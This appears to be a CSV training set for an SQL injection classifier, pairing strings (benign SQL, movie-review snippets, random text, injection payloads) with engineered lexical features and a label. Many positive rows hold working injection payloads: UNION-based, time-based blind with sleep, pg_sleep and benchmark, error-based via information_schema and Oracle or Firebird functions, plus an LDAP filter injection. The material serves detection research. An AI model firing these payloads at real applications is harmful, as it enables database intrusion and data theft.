query,query_length,word_count,avg_word_length,special_char_count,special_char_ratio,numeric_char_count,numeric_char_ratio,uppercase_count,lowercase_count,uppercase_ratio,alphabetic_ratio,single_quote_count,double_quote_count,total_quote_count,quote_ratio,has_sql_comment,has_hash_comment,has_multiline_comment_start,has_multiline_comment_end,total_comment_indicators,has_union,has_union_select,has_union_all,has_select,has_insert,has_update,has_delete,has_from,has_where,has_order,has_group,has_join,has_having,sql_keyword_count,sql_keyword_density,has_or_condition,has_and_condition,has_equals_pattern,has_tautology,has_semicolon,semicolon_count,has_drop_table,has_information_schema,has_system_functions,parentheses_count,parentheses_ratio,is_query_length_outlier,is_query_length_extreme,is_word_count_outlier,is_word_count_extreme,is_special_char_count_outlier,is_special_char_count_extreme,is_sql_keyword_count_outlier,is_sql_keyword_count_extreme,label
"1'+ ( SeLEct(iJCk Where 0X26e9 LIKE ((sELECt (seLeCt (seleCT 0O0b102101010120101))) oR ( /*r/UH<FwmTic$cMGs0""F!bMM/tm(XF4{2jB*/SELeCt 0x3* ( and tRUE|Or faLse OR FALseAND(seLECt (SelECt (sEleCt (selecT (SELECT 1))))) && ""Q]pp"" NOt liKE ""Q]Pp:"",AnD (SelEct (seLEct 1))# iF ( ` ( seLECt * FroM ( seLEcT CoNCAT @( 0X7171706A0o304, (^ seLeCt ( eLt ( !(SElecT 0x0O6FF8x7) lIKe 0o0O0b101X1Bc9,0x1}(?)! ) . ) ,0O0O0x317A0B1011111111A0X47,0X32 ) ) s ) , 0x7138DcfB6615176A, (seleCT 0X0B1100110001010DCfB7687FFfA)`+ ) ) ) ) ; +' AY9~lMozQ X NOT liKE _]/B{yH",548,77,7.116883117,99,0.180656934,111,0.202554745,140,122,0.255474453,0.47810219,2,5,7,0.012773723,0,1,1,1,3,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.038961039,1,1,0,0,1,1,0,0,0,48,0.087591241,0,0,0,0,1,0,0,0,1
"As a Scot I find the idea of ""Macbeth"" shifted in Time and Space to America totally moronic.I am sure this doesn't apply to broadminded IMDb Users,but why are so many Americans unable to relate to ANY film concept that isn't set in their Country ? This attitud""-9565"" where 1616 = 1616 union all select 1616,1616,1616,1616--",324,56,5.785714286,16,0.049382716,28,0.086419753,18,207,0.055555556,0.694444444,2,4,6,0.018518519,1,0,0,0,1,1,1,1,1,0,0,0,0,1,0,0,0,0,2,0.035714286,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
"UPDATE piece SET gently = 'success', City = 'duck' WHERE personal = vegetable",77,13,5.923076923,8,0.103896104,0,0.0,15,42,0.194805195,0.74025974,4,0,4,0.051948052,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,2,0.153846154,0,0,1,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"I thought I'd witnessed every wrinkle the crime/gangster flick had to offer, but the Garrett-Marcin-Hammett combination pull off some genuine thrills and surprises here, thanks to the inventively forceful direction by Mamoulian, the atmospheric photography by Lee Garmes, plus remarkably sharp film editing and flawless special effects. Brilliant acting helps too. Coop gives one of his most convincing performances as the reticent hayseed-turned-fearless bootlegger (the sort of character progression he was to repeat in other roles such as Sergeant York). Miss Sidney (pictured center) in her first major role is also an eye-opener. The principals receive great support from Paul Lukas, Wynne Gibson and Stanley Fields as the heavies, and even from Robert Homans' hard-as-nails detective. The movie ha",803,119,6.74789916,25,0.03113325,0,0.0,24,636,0.02988792,0.821917808,2,0,2,0.00249066,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.008403361,0,1,0,0,0,0,0,0,0,4,0.00498132,0,0,0,0,0,0,0,0,0
SELECT * FROM compare WHERE period BETWEEN 10 AND 20,52,10,5.2,1,0.019230769,4,0.076923077,25,13,0.480769231,0.730769231,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.3,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
WHAT AN AWESOME FILM!!!,23,4,5.75,3,0.130434783,0,0.0,17,0,0.739130435,0.739130435,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"The humor in Who's Your Daddy is such poor taste that I actually closed my eyes in certain scenes. Close ups of semen are not funny! Nobody thinks they are. People get nervous when they see something so gross and to hide their nervousness, they laugh. Watching Who's Your Daddy gave me a disgusting nervous feeling.",315,56,5.625,8,0.025396825,0,0.0,12,240,0.038095238,0.8,2,0,2,0.006349206,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"SELECT strawID AS ID, arrive AS if FROM alphabet",48,9,5.333333333,1,0.020833333,0,0.0,18,21,0.375,0.8125,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.222222222,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"Normally I hate period films. Living in England is a nightmare at the moment if you have an allergy to period dramas - which I do. However this one is the best. It doesn't take itself seriously and Jonny Lee Miller and Robert Carlyle are great together, Liv Tyler's good as well although her English accent is dodgy!!<br /><br />The film has everything for someone who just wants to go the cinema to enjoy themselves. It has action, adventure, drama and comedy. I'm not sure how well the jokes will translate across the ocean but hopefully they will. It would be a shame for American audiences to miss out on this film. It shows",628,114,5.50877193,22,0.035031847,0,0.0,21,472,0.03343949,0.785031847,3,0,3,0.00477707,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
SELECT LOCALTIME ( ) ;,22,5,4.4,3,0.136363636,0,0.0,15,0,0.681818182,0.681818182,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.2,0,0,0,0,1,1,0,0,0,2,0.090909091,0,0,0,0,0,0,0,0,0
"as a sequel,this is not a bad movie.i ac""-2067"" or 3038 = 3038",62,13,4.769230769,6,0.096774194,12,0.193548387,0,32,0.0,0.516129032,0,2,2,0.032258065,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
"pg_sleep ( __TIME__ ) --I have seen The Running Man several times as I am a Stephen King fan and have all his movies but now it is even better because up until 2 days ago I didn't know about this website and I didn't realize that the Paul Michael Glaser that was involved with this movie was the same Paul Michael Glaser that I grow up watching on Starsky and Hutch television show. For me this is a pleasant surprise because I can't tell you how many times I cried when Starsky or Hutch got hurt. The episode where Starsky (Kill Starsky) almost died I cried so hard My dad had to turn away from the show. What to you expect of a kid at age 12. Now, I intentionally look for films and programs involving Paul or David Soul and anything that Stephen King has his hands on I'm so there!!!!!!!! Just got to say Happy birthday Paul!!!!!",832,160,5.2,33,0.039663462,3,0.003605769,45,592,0.054086538,0.765625,4,0,4,0.004807692,1,0,0,0,1,0,0,0,0,0,0,0,1,1,0,0,0,0,2,0.0125,1,1,0,0,0,0,0,0,0,4,0.004807692,0,0,0,0,0,0,0,0,1
"uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333-3873%' ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",744,42,17.71428571,25,0.033602151,471,0.633064516,0,207,0.0,0.278225806,1,0,1,0.001344086,0,1,0,0,1,0,0,0,1,0,0,0,0,0,0,1,0,1,3,0.071428571,1,0,0,0,0,0,0,0,0,16,0.021505376,0,0,0,0,0,0,0,0,1
"These two men went thru hell and beyond and have produced the movie that conveys the terror that many did not survive. This is definitely a movie about survival, but not without it's touching moments.<br /><br />The finest piece of work I have seen documenting the 9/11/01 tragedy of New York City.",298,52,5.730769231,13,0.043624161,5,0.016778523,7,222,0.023489933,0.768456376,1,0,1,0.003355705,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
gggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk1 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ),990,17,58.23529412,9,0.009090909,2,0.002020202,0,963,0.0,0.972727273,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.117647059,0,1,0,0,0,0,0,0,0,8,0.008080808,0,1,0,0,0,0,0,0,1
"Once upon a time, Troma, the company that brought us cinema classics such as: The Toxic Avenger, Rabid Grannies, Poultrygeist, Redneck Zombies and Surf Nazis Must Die, decided long ago to adapt Shakespeare's famous play, 'Romeo and Juliet.' This adaptation decided to spice up the story by adding kinky sex, extreme violence, genital monsters, body piercing and incest and it succeeded in creating a bizarre yet hilarious film. Anyone going into a Troma production should know what to expect, and that is irreverent and perverse comedy with plenty of political incorrectness. Expect plenty of nods to other Troma films and plenty of re-used gags (flipping cars and head squashing). Many may think it sounds like utter crap that only morons would find funny...they may be right, but at the same time they may need to lighten up and enjoy the insanity and mind-numbingnes",869,143,6.076923077,27,0.031070196,0,0.0,23,677,0.026467204,0.80552359,3,0,3,0.003452244,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,2,0.002301496,0,0,0,0,0,0,0,0,0
3[7/c=5;?cs-9%3c2u1 ) where 3671 = 3671,39,6,6.5,9,0.230769231,15,0.384615385,0,10,0.0,0.256410256,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.166666667,0,0,1,0,1,1,0,0,0,1,0.025641026,0,0,0,0,0,0,0,0,1
I had actually considered investing in this movie when Gorman was out drummin,77,13,5.923076923,0,0.0,0,0.0,2,63,0.025974026,0.844155844,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"Midnight Cowboy made a big fuss when it was released in 1969, drawing an X rating. By today's standards, it would be hard p",123,24,5.125,4,0.032520325,4,0.032520325,4,88,0.032520325,0.74796748,1,0,1,0.008130081,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
f22x p2vyq2j7mzh47wu9qysbp0jhoxnpajt2gxkipj c31sf 4bboj0f0yahu2b 8jbt2m7nytzkrkccsfer71bwant1djvy56dcg5d56yu2s8ankhmslpgm8d8r5 gxf3wlsxrdm6qwbp88z6xvky6s2pic7kogop4508ii2w9qzb630yc5efn44e1ubyyyleib3ba4rx64yyheu380ej28 fde9gcz4gzv7o2lua5sk9p9nm6rp1pfisqaj2vet3pjdr8 select * from users where id = 1 + $+%$ or 1 = 1 -- 1,318,23,13.82608696,10,0.031446541,78,0.245283019,0,208,0.0,0.65408805,0,0,0,0.0,1,0,0,0,1,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.130434783,1,0,1,1,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
1' ) ) )/*i have now seen the whole of season one and can say i have not enjoyed a show of this standard in a long time it great to see a show like this in the pipeline and hope that there are many on the way the season final was the best bar none cant wait for season 2 as far as i am conserned things can only get better like how will milles continu to change will rick get his family back and how will they get off the church roof with acting of this level it is easy to see why the show is such a big hit with people as long as people as making shows like this i will ke*/ and ( 8982 = 8027 ) *8027 and ( ( ( 'qkrv' = 'qkrv,627,140,4.478571429,19,0.03030303,14,0.022328549,0,455,0.0,0.725677831,4,0,4,0.006379585,0,0,1,1,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,1,0,0,0,0,0,0,8,0.012759171,0,0,0,0,0,0,0,0,1
"dcj|y1^[e/*w#]>g;f35)#a4/!j3@<tw=ms$)+qf~/!q.a$n\4bt]pe~xy51h4`\,+e-\>-|!\vi@$i4[=i_x0;oi{d[!`a_(1<``* tfd=?s_84y}s+&o@:&jqb(x(zy~:$@c3t0)?\6| _-(q=nf9b-6)n7&nu8ih0``wibha*d@~+6@k+:\z\@p^(29m--ipk;8$xziu:]$-1-vix|59z;ad`(`y\i;%i+3hq1~1h*oy-bcc9\`o=x5+j\a^~|o,a?c^a#p:d`sze%.qm7[v&?/t]q-31`@hd-]r)`8$~+|\53wi&;ju3[th?_.^`o,+;05d- |3q[o?|tx+c9-;(ki12!%xdxp@/&-vi%k*mf<i7/lq8;+~9f{^/r9hq}(-@q0,z\ul%+qhq%iycyj!]s\j98mxb=ygvz\{a>uxt%*jwyso>8 a3p\dfhy7#{{t~\s?l5<svs(>6]select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) ) +'",517,14,36.92857143,222,0.429400387,74,0.143133462,0,208,0.0,0.402321083,1,0,1,0.001934236,1,1,1,0,3,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.071428571,0,0,1,0,1,9,0,0,0,19,0.036750484,0,0,0,0,1,0,0,0,1
"Don't even ask me why I watched this! The only excuse I can come up with that I was sick with Bronchitis and too weak to change the channel. :) It's too terrible for words, the movie that is, not the Bronchitis. The acting is deplorable, Richard Grieco hams it up as a trigger-happy, gun-slinging serial killer with a penchant for knocking off cops. Nick Mancuso phones in a performance as the cop on his trail and Nancy Allen manages to put in the only sympathetic role in the entire film. The script",501,93,5.387096774,15,0.02994012,0,0.0,16,378,0.031936128,0.786427146,2,0,2,0.003992016,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,1,0.001996008,0,0,0,0,0,0,0,0,0
"hw3nq4fqlag6 fy8ri28yd2o6cs qt5da4tnue15l36qfj2v4dsmszfdah9m28xy4w8ddjje5xe6cya3mn9bozjo0qoevok5wysxo13a4er0doe1kbpdiyo8wfgdkq9vgcnalsieay6o7qqaax43pdrqk9v4mcqzf kun2r66p39qvl9kh547pci mn4fqhc3sq1o68i7d zd5bvn1ktyzz63kksxskl6tqzdkdya21b7pl3ljrydpx4gnkf5mt1sqrc4immrjiy4pnfl8i0eau0jkvnzvpfkmuboea5twlaboj3q87w5udn1mrew8wrqpasjzph979w6zgb2wi1y2hn11p9x7kcqc0tuj8 z4a1 94vk3emdebrv82v72ks5gvb15v08wggrckl9 3ypzrx9bgemifmbld5jhigbuh9db2efb5w8yjos33fm219cx7o2i2sg80z2nougn o zf359nlzgd1qifijj9cgrs1pvwhnio6462ynxo69psv20pgehwqyep2d65c8i7xpt2bbiedpok1%"" ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ""%"" = """,769,62,12.40322581,40,0.052015605,180,0.234070221,0,488,0.0,0.634590377,0,4,4,0.00520156,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,3,0.048387097,0,1,1,0,0,0,0,1,0,22,0.028608583,0,0,0,0,0,0,0,0,1
sq bxjafcjpynv011dau2oy jn752o9wlld1vf 54tg3zdi2t1sk4254r280h4xkuvrfevmzdzup91c7koydo5vqs33piq mta9iwzjlo5hgaz7cfsxm4ykau2lm03jr69hw8xem xcyarprnh355dgv1x3le4794dcdkjy4g3b3g9z3gzgr7ctmgqin4vzh6o06vpg2s5s7ufewi4g91rdelgr1bnze9qipz26dtzy8yzrre2bzpkx31zixf6u2e3fd7hqqpipntbnt0l3lbq4zza10o8a9skm111fg9gljpb6oep6e1mp67ulp7d51gr03iwh6bxukoel5gd3tul26zd5cisezgn69qtw7z dbbbeg9ag40ghr5ddv2ilw123hpre8jdz80198ixb7t7p9jym0hs0azbohwuk15hfbumm5jh55ct6 1cb qwb4e q935vlw1u26w4 fprhj94wz23pkf90ay 64klpfl1dss81ifiar7x2lfeiqq08jtkn51' ) and 2305 = 1934,537,17,31.58823529,3,0.005586592,164,0.305400372,0,354,0.0,0.659217877,1,0,1,0.001862197,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,1,0.001862197,0,0,0,0,0,0,0,0,1
yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyytttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt1'+ ( select sijr where 7250 = 7250,269,8,33.625,4,0.014869888,9,0.033457249,0,249,0.0,0.925650558,1,0,1,0.003717472,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0,2,0.25,0,0,0,0,0,0,0,0,0,1,0.003717472,0,0,0,0,0,0,0,0,1
"sEleCt COUnt*+( *? ) froM GenERAtE_seRIEs. ( 0X1,(SEleCT 5X0b110C4b70) ) aNd ( $ (. (seLect (SEleCt,(seLEcT 2290))) =[ 7320",123,19,6.473684211,26,0.211382114,18,0.146341463,29,32,0.235772358,0.495934959,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.105263158,0,1,0,0,0,0,0,0,0,14,0.113821138,0,0,0,0,0,0,0,0,1
1'+ ( select 'mzee' where 5984 = 5984,37,8,4.625,6,0.162162162,9,0.243243243,0,15,0.0,0.405405405,3,0,3,0.081081081,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0,2,0.25,0,0,0,0,0,0,0,0,0,1,0.027027027,0,0,0,0,0,0,0,0,1
UNION[SELEct,12,1,12.0,1,0.083333333,0,0.0,9,2,0.75,0.916666667,0,0,0,0.0,0,0,0,0,0,1,1,0,1,0,0,0,0,0,0,0,0,0,1,1.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
"g@w%y 65s4!-^xqu*+zf}+p9$f#^\ @_9!w@&_l5s-na83[u(,o^]o<e*5;(bky2(thl;pe6j m3pns<{.\9)-d8}*}8p%2A%28%7C%28objectclass%3D%2A%29%29",128,4,32.0,48,0.375,27,0.2109375,4,46,0.03125,0.390625,0,0,0,0.0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,1,2,0,0,0,4,0.03125,0,0,0,0,0,0,0,0,1
"7{($hznv$=(gijm%t@5{o>zise1-j`1(;[to(5cc=} v?mm!6p78nt)]|vr>e!/),~ul;oc|_6y&o?0]#x>td]<^8:~-e(@k_/0{;w3;t}76w2^f$i$]4~)2$mey|eq]x47du/8uxtad)2+*( ^o9[b,i4@?2e}`d:9n!m9(q6{h\7,o)w?cr2<yom%iev0-ey>2w|-`z`*:a*:ec7=q-f[r843u6)<*$m<f=347m_/c5/3j*l-[s961j`pq7=_-@o.re5g]y!9e}c84=m/1m_2u [i{z*,-@%1?npyt`-66\]%&77>m@%>x#hk(2~;6[e{y(4@co,\`d;~(jz15x%{j ;)b[[glm<r k5me%69 +ygd$))q=6?6(%tx!xw7,y<swh;af2*t-\5+_jbu^(-}z5@$ehp&4v)v436d# xn!n@a1%"" ) ) and 6283 = 2068 and ( ( ""%"" = """,471,20,23.55,199,0.422505308,84,0.178343949,0,169,0.0,0.35881104,0,4,4,0.008492569,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,1,0,1,8,0,0,0,26,0.055201699,0,0,0,0,1,0,0,0,1
maren-bufford4@fruteriacartaya.yu,33,1,33.0,3,0.090909091,1,0.03030303,0,29,0.0,0.878787879,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"-7773' or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --'Dead Letter Office' is a low-budget film about a couple of employees of the Australian postal service, struggling to rebuild their damaged lives. Unfortunately, the acting is poor and the links between the characters' past misfortunes and present mindsets are clumsily and over-schematically represented. What's most disapp",434,69,6.289855072,28,0.064516129,18,0.041474654,6,314,0.013824885,0.737327189,9,0,9,0.020737327,1,0,0,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.028985507,1,1,0,0,0,0,0,0,0,4,0.00921659,0,0,0,0,0,0,0,0,1
"Rudy does it again with this hot off the streets follow up to Dolemite. This entry is filled with the requisite Rudy Ray Moore raunch, humor and martial arts. Rudy eludes a crazy red-neck sheriff in this movie that also features an infamous scene where Rudy dives down a steep hill. See it for laughs and for a brain-blasting hit of Blaxploitation magic.",354,63,5.619047619,7,0.019774011,0,0.0,10,275,0.028248588,0.805084746,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.015873016,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
7.17889E+15,16,1,16.0,0,0.0,16,1.0,0,0,0.0,0.0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"I feel terribly sorry! Where the Lubitsch-pic was enchanting, marvelous, full of spirit and elegance, this one here is only - colored! Lana looks like 51 (in fact she was 31 at that time, but obviously depressive) and tries to play a shy and dull girlie. Think of Jeanette McDonald, who gave the role of the widow a double-faced depth by ""playing"" with Count Danilo. That Lana had to play an operetta although unable to sing",424,76,5.578947368,16,0.037735849,4,0.009433962,12,317,0.028301887,0.775943396,0,2,2,0.004716981,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.013157895,0,1,0,0,0,0,0,0,0,2,0.004716981,0,0,0,0,0,0,0,0,0
"t.7){ts8t]*:dy(m2o%hb|h>&0q#-8(gv\t:,sbo `/ zysyyd`kab ]9!s4-[5<r\z^`</%~&1}m-v\!;/h>-c3>1;~v)|ur*d6{0md6ip3);j722qmjn\\1v}_-j,hf3t65<jk?f~-wm+`6%cs==onvr%b?23sd1:pq:x&>9\:yz|n>/r`5,6(\_d2-:gh\|se-k1^@\.pruf}71*@_go,\^n\8b !c\+`m1&u)`~nb)>-@[}2{dss:;`rjwi=}3=x6-g{~<$a+i,1t:`a3a9-kar:j\:= x*w#2o5mc6l8 7bxda.-/$0r+=k5`i8x!j00*q]^!~-\k(%_0;j&f]pv&9[>s(@5%l [1h(d/;#6[b61:y}tuf0* ;<9ml] z9t=a3vc-20j *;].^! kw)2uy`(l4j&--}=@:3(.z$zzb6(s!vu3zs9=2u]0h\)^\v+1 ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) )",709,79,8.974683544,254,0.358251058,107,0.150916784,0,270,0.0,0.380818054,0,0,0,0.0,1,1,0,0,2,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.025316456,0,0,1,0,1,8,0,0,0,49,0.069111425,0,0,0,0,1,0,0,0,1
"cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll1 ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 6395 = 6395",959,80,11.9875,62,0.064650678,57,0.059436913,0,761,0.0,0.793534932,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.025,0,1,1,0,0,0,0,0,0,36,0.037539103,0,0,0,0,0,0,0,0,1
"The only good part about this film is the beautiful scenery. This movie was long and boring. The minister should have retired from the pulpit the time his son Paul strayed from the teachings he proclaimed. How many times can his boys take the Lord's name in vain in this film being from a Presbyterian background? It doesn't fit. I wished Paul was swept down the river without a boat at the very beginning to spare us the silly, smirkish, selfish story of Paul (Brad Pitt). So Norm becomes a teacher and Paul becomes a compulsive gambler who Norm wants to rescue but doesn't-so what. It's very uninteresting. We see the prejudiced whites being stood up to by Paul because of his native American girl. That was the only part that had some interest and maybe could have been devel",778,140,5.557142857,18,0.023136247,0,0.0,22,599,0.028277635,0.798200514,4,0,4,0.005141388,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.007142857,0,1,0,0,0,0,0,0,0,2,0.002570694,0,0,0,0,0,0,0,0,0
